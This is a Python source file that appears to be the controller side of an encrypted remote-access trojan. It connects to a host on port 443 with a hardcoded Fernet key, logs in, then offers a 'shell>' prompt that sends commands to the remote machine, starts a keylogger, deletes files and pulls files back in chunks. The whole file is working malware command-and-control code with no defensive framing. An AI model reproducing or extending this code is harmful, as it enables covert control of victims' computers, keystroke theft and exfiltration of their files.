import socket
from cryptography.fernet import Fernet


key = b'dIDIXfq6xvMp0gshF8rI8-AGb41aucYBVR27nQWG2Xc='
cipher = Fernet(key)

def Encrypt(data):
    return cipher.encrypt(data)

def Decrypt(data):
    return cipher.decrypt(data)

conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

conn.connect(('192.168.50.200',443))

print(Decrypt(conn.recv(1024)).decode(), end="")
conn.send(Encrypt(input().encode()))
print(Decrypt(conn.recv(1024)).decode(), end="")
conn.send(Encrypt(input().encode()))

response = Decrypt(conn.recv(1024)).decode()
print(response)
if "failed" in response:
    conn.close()
    exit()



while 1:
    try:
        payload = input("shell> ")
        if "del" in payload:
            conn.sendall(Encrypt(payload.encode()))
            result = Decrypt(conn.recv(1024))
            print(result.decode())
        elif "keylogger" in payload:
            conn.sendall(Encrypt(payload.encode()))
            while 1:
                result = Decrypt(conn.recv(1024))
                if result.decode() != "Done":
                    print(result.decode().strip())
                else:
                    break
        else:
            conn.sendall(Encrypt(payload.encode()))
            len_chunks = Decrypt(conn.recv(1024)).decode()
            print(f"Chunks coming: {len_chunks}")
            full_encrypted_data = b''
            for i in range(int(len_chunks)):
                chunk =conn.recv(1024)
                full_encrypted_data += chunk
            if "download" in payload:
                file_name = payload.split(" ")
                with open(f"./{file_name[1]}","ab") as file:
                    file.write(Decrypt(full_encrypted_data))
                    file.close()
                    print("Done")

            try:
                if "download" not in payload:
                    decrypted_data = Decrypt(full_encrypted_data).decode()
                    print(decrypted_data)
                else:
                    pass
            except Exception as e:
                print(f"Error decrypting data: {e}")
    except KeyboardInterrupt:
        print("\nClosing connection")
        conn.sendall(Encrypt(b'close'))
        break

conn.close()

